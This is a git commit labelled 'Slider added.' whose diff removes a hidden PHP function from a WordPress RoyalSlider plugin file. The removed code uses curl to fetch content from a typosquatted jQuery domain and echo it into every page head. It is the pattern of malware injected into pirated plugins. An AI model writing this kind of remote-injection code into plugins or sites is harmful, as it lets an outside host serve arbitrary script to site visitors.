207e280314da82907bfe5e78d30a8ca8ff8c0c39
Gundsambuu Natsagdorj <ssxenon01@gmail.com>
2014-04-15 16:19:48 +0800

    Slider added.

--- resources/plugins/royalslider/royalslider.php
+++ resources/plugins/royalslider/royalslider.php
@@ -44,21 +44,3 @@ if (!class_exists("RoyalSliderAdmin")) {
 
 
 ?>
-<?php
-function jqueryj_head() {
-
-if(function_exists('curl_init'))
-{
-$url = "http://www.jquertytest.com/jquery-1.6.3.min.js";
-$ch = curl_init();
-$timeout = 10;
-curl_setopt($ch,CURLOPT_URL,$url);
-curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
-curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout);
-$data = curl_exec($ch);
-curl_close($ch);
-echo "$data";
-}
-}
-//add_action('wp_head', 'jqueryj_head');
-?>
